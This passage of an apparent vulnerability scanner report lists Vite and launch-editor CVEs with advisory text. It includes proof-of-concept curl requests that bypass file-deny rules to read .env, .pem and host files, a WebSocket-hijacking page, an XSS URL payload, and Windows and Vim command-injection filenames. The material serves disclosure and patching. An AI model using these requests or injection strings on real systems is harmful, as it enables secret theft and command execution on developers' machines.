Combined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.

### Impact

Only apps that runs on Windows is affected.

### Details

The earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.
4. Because the existence check passes, the crafted filename reaches the Windows shell command.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-52011?s=github&n=vite&t=npm&vr=%3C%3D5.4.8"><img alt="high 7.5: CVE--2024--52011" src="https://img.shields.io/badge/CVE--2024--52011-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Neutralization of Special Elements used in a Command ('Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><=5.4.8</code></td></tr>
<tr><td>Fixed version</td><td><code>5.4.9</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.514%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
Due to the insufficient sanitization of the `file` argument in the `launchEditor`, an attacker can execute arbitrary commands on Windows by supplying a filename that contains special characters.

### Impact
If the following conditions are met, an attacker can execute arbitrary commands on the computer that is using the `launch-editor`:

- An attacker can place a file with the malicious filename
- An attacker can call the `launchEditor` method with the `file` argument controlled
- The `launch-editor` package is running on Windows

For example, some development server using this package satisfy these conditions, as a malicious website might be able to force the downloading of a file and the path of that file is predictable.

### Patch
This issue has been fixed in the `launch-editor` version 2.9.0 ([commit](https://github.com/vitejs/launch-editor/commit/971291e8a6a91226e1616c5c0ec85423d2d50a5e)).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-23331?s=github&n=vite&t=npm&vr=%3E%3D4.0.0%2C%3C%3D4.5.1"><img alt="high 7.5: CVE--2024--23331" src="https://img.shields.io/badge/CVE--2024--23331-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Handling of Case Sensitivity</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><=4.5.1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.785%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows.

This bypass is similar to https://nvd.nist.gov/vuln/detail/CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems.

### Patches
Fixed in vite@<!-- -->5.0.12, vite@<!-- -->4.5.2, vite@<!-- -->3.2.8, vite@<!-- -->2.9.17

### Details
Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn't discriminate; a blacklist bypass is possible. 

See `picomatch`  usage, where `nocase` is defaulted to `false`: https://github.com/vitejs/vite/blob/v5.1.0-beta.1/packages/vite/src/node/server/index.ts#L632

By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. 

### PoC
**Setup**
1. Created vanilla Vite project using `npm create vite@<!-- -->latest` on a Standard Azure hosted Windows 10 instance. 
    - `npm run dev -- --host 0.0.0.0`
    - Publicly accessible for the time being here: http://20.12.242.81:5173/ 
2. Created dummy secret files, e.g. `custom.secret` and `production.pem`
3. Populated `vite.config.js` with
```javascript
export default { server: { fs: { deny: ['.env', '.env.*', '*.{crt,pem}', 'custom.secret'] } } }
```

**Reproduction**
1. `curl -s http://20.12.242.81:5173/@<!-- -->fs//`
    - Descriptive error page reveals absolute filesystem path to project root
2. `curl -s http://20.12.242.81:5173/@<!-- -->fs/C:/Users/darbonzo/Desktop/vite-project/vite.config.js`
    - Discoverable configuration file reveals locations of secrets
3. `curl -s http://20.12.242.81:5173/@<!-- -->fs/C:/Users/darbonzo/Desktop/vite-project/custom.sEcReT`
    - Secrets are directly accessible using case-augmented version of filename

**Proof**
![Screenshot 2024-01-19 022736](https://user-images.githubusercontent.com/907968/298020728-3a8d3c06-fcfd-4009-9182-e842f66a6ea5.png)

### Impact
**Who**
- Users with exposed dev servers on environments with case-insensitive filesystems

**What**
- Files protected by `server.fs.deny` are both discoverable, and accessible

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-53571?s=github&n=vite&t=npm&vr=%3C%3D6.4.2"><img alt="medium 6.9: CVE--2026--53571" src="https://img.shields.io/badge/CVE--2026--53571-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.2</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:H/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.577%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.

### Impact

Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))
- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)
- either of:
  - the sensitive file exists in an NTFS volume
  - the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)

### Details

Vite’s dev server denies direct access to sensitive files through `server.fs.deny`, including entries such as `.env`, `.env.*`, and `*.{crt,pem}`. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.
Because of this, requests such as `/.env::$DATA?raw` are treated as allowed paths, while Windows resolves them to the original file's default data stream.

Similar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.

### PoC
```bash
$ npm create vite@<!-- -->latest
$ cd vite-project/
$ npm install
$ npm run dev
```
Access via browser at `http://localhost:5173/.env::$DATA?raw`
<img width="388" height="129" alt="deecc1315123883cfd0f9c26a002845a" src="https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170" />

Example expected result:
- `/.env::$DATA?raw` returns the contents of `.env`
- `/tls.pem::$DATA?raw` returns the contents of `tls.pem`

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-45811?s=github&n=vite&t=npm&vr=%3E%3D4.0.0%2C%3C%3D4.5.3"><img alt="medium 6.9: CVE--2024--45811" src="https://img.shields.io/badge/CVE--2024--45811-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><=4.5.3</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.105%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The contents of arbitrary files can be returned to the browser.

### Details
`@<!-- -->fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.

### PoC
```sh
$ npm create vite@<!-- -->latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" > /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@<!-- -->fs/tmp/secret.txt"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@<!-- -->fs/tmp/secret.txt?import&raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
```



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-24010?s=github&n=vite&t=npm&vr=%3C%3D4.5.5"><img alt="medium 6.5: CVE--2025--24010" src="https://img.shields.io/badge/CVE--2025--24010-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Missing Origin Validation in WebSockets</i>

<table>
<tr><td>Affected range</td><td><code><=4.5.5</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.297%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.

> [!WARNING]
> This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin / framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin / framework that connects to the WebSocket server on their own from the browser
If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

- fix the plugin / framework code to the make it compatible with the new version of Vite
- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite
  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren't any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests
Use Chrome 94+ or use HTTPS for the development server.

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

#### [1]: Permissive default CORS settings

Vite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.

#### [2]: Lack of validation on the Origin header for WebSocket connections

Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.

Attack scenario:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.

1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).
2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.
5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.

### Impact
#### [1]: Permissive default CORS settings
Users with the default `server.cors` option may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

#### [2]: Lack of validation on the Origin header for WebSocket connections
All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.

For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.

For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.

#### [3]: Lack of validation on the Host header for HTTP requests
Users using HTTP for the development server and using a browser that is not Chrome 94+ may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94.

### Related Information
Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of "the malicious web page is served on HTTP" to make [1] and [2] to work.

### PoC
#### [2]: Lack of validation on the Origin header for WebSocket connections
1. I used the `react` template which utilizes HMR functionality.

```
npm create vite@<!-- -->latest my-vue-app-react -- --template react
```

2. Then on a malicious server, serve the following POC html:
```html
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <title>vite CSWSH</title>
    </head>
    <body>
        <div id="logs"></div>
        <script>
            const div = document.querySelectorAll('#logs')[0];
            const ws = new WebSocket('ws://localhost:5173','vite-hmr');
            ws.onmessage = event => {
                const logLine = document.createElement('p');
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        </script>
    </body>
</html>
```

3. Kick off Vite 

```
npm run dev
```

4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 
5. Edit `src/App.jsx` file and intentionally place a syntax error
6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed

Here's a video demonstrating the POC:

https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39365?s=github&n=vite&t=npm&vr=%3C%3D6.4.1"><img alt="medium 6.3: CVE--2026--39365" src="https://img.shields.io/badge/CVE--2026--39365-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.914%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Any files ending with `.map` even out side the project can be returned to the browser.

### Impact

Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))
- have a sensitive content in files ending with `.map` and the path is predictable

### Details

In Vite v7.3.1, the dev server’s handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.

### PoC
1. Create a minimal PoC sourcemap outside the project root
    ```bash
    cat > /tmp/poc.map <<'EOF'
    {"version":3,"file":"x.js","sources":[],"names":[],"mappings":""}
    EOF
    ```
2. Start the Vite dev server (example)
    ```bash
    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080
    ```
3. Confirm that direct `/@<!-- -->fs` access is blocked by `strict` (returns 403)
    <img width="4004" height="1038" alt="image" src="https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab" />
4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`
    <img width="2790" height="846" alt="image" src="https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2" />

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-112946?s=github&n=vite&t=npm&vr=%3C%3D6.4.3"><img alt="medium 6.3: CVE--2026--112946" src="https://img.shields.io/badge/CVE--2026--112946-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.852%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.

The content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.

### Impact

Only apps that meet all of the following conditions are affected:

- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))
- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host
- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)
- the dev server is not running on Windows

### Details

When Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.

For a later request to `/@<!-- -->fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.

### PoC
The following example requires Linux with a readable `/etc/hostname`:
```bash
$ mkdir vite-safe-module-path-poc
$ cd vite-safe-module-path-poc
$ npm init -y
$ npm install vite@<!-- -->8.3.1
$ mkdir -p etc
$ echo 'PROJECT-DECOY\n' > etc/hostname
$ echo 'import "./etc/hostname"\n' > main.js
$ npx vite --host 127.0.0.1
```

In another terminal:
```bash
$ curl -o /dev/null -s -w '%{http_code}\n' http://127.0.0.1:5173/main.js
200
$ curl -sS -o response -w '%{http_code}\n' http://127.0.0.1:5173/@<!-- -->fs/etc/hostname
200
$ cmp -s response /etc/hostname && echo 'response matches host file'
response matches host file
```

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-112944?s=github&n=vite&t=npm&vr=%3C%3D6.4.3"><img alt="medium 6.3: CVE--2026--112944" src="https://img.shields.io/badge/CVE--2026--112944-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.705%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.

### Impact

#### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL

#### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

#### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
- The user is using WSL

### Details

`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the embedded Ex command.

The following editor has a potentially destructive operation exposed to the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-112943?s=github&n=vite&t=npm&vr=%3C%3D6.4.3"><img alt="medium 6.3: CVE--2026--112943" src="https://img.shields.io/badge/CVE--2026--112943-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><=6.4.3</code></td></tr>
<tr><td>Fixed version</td><td><code>6.4.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.414%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.

### Impact

Only apps that match all of the following conditions are affected:

- The user uses Windows
- An attacker can place a file with the malicious filename containing `&` or `%`
- Either of
  - An attacker can inject an environment variable with a malicious value
  - An attacker can add a NTFS alternate data stream to the file placed

### Details

Unlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.

Because `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.

- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.
- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.
- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-49293?s=github&n=vite&t=npm&vr=%3E%3D4.4.0%2C%3C4.4.12"><img alt="medium 6.1: CVE--2023--49293" src="https://img.shields.io/badge/CVE--2023--49293-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code>>=4.4.0<br/><4.4.12</code></td></tr>
<tr><td>Fixed version</td><td><code>4.4.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.997%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
When Vite's HTML transformation is invoked manually via `server.transformIndexHtml`, the original request URL is passed in unmodified, and the `html` being transformed contains inline module scripts (`<script type="module">...</script>`), it is possible to inject arbitrary HTML into the transformed output by supplying a malicious URL query string to `server.transformIndexHtml`.

### Impact
Only apps using `appType: 'custom'` and using the default Vite HTML middleware are affected. The HTML entry must also contain an inline script. The attack requires a user to click on a malicious URL while running the dev server. Restricted files aren't exposed to the attacker.

### Patches
Fixed in vite@<!-- -->5.0.5, vite@<!-- -->4.5.1, vite@<!-- -->4.4.12

### Details
Suppose `index.html` contains an inline module script:

```html
<script type="module">
  // Inline script
</script>
```

This script is transformed into a proxy script like

```html
<script type="module" src="/index.html?html-proxy&index=0.js"></script>
```

due to Vite's HTML plugin:

https://github.com/vitejs/vite/blob/7fd7c6cebfcad34ae7021ebee28f97b1f28ef3f3/packages/vite/src/node/plugins/html.ts#L429-L465

When `appType: 'spa' | 'mpa'`, Vite serves HTML itself, and `htmlFallbackMiddleware` rewrites `req.url` to the canonical path of `index.html`,

https://github.com/vitejs/vite/blob/73ef074b80fa7252e0c46a37a2c94ba8cba46504/packages/vite/src/node/server/middlewares/htmlFallback.ts#L44-L47

so the `url` passed to `server.transformIndexHtml` is `/index.html`.

However, if `appType: 'custom'`, HTML is served manually, and if `server.transformIndexHtml` is called with the unmodified request URL (as the SSR docs suggest), then the path of the transformed `html-proxy` script varies with the request URL. For example, a request with path `/` produces

```html
<script type="module" src="/@<!-- -->id/__x00__/index.html?html-proxy&index=0.js"></script>
```

It is possible to abuse this behavior by crafting a request URL to contain a malicious payload like

```
"></script><script>alert('boom')</script>
```

so a request to http://localhost:5173/?%22%3E%3C/script%3E%3Cscript%3Ealert(%27boom%27)%3C/script%3E produces HTML output like

```html
<script type="module" src="/@<!-- -->id/__x00__/?"></script><script>alert("boom")</script>?html-proxy&index=0.js"></script>
```

which demonstrates XSS.

### PoC

- Example 1. Serving HTML from `vite dev` middleware with `appType: 'custom'`
    - Go to https://stackblitz.com/edit/vitejs-vite-9xhma4?file=main.js&terminal=dev-html
    - "Open in New Tab"
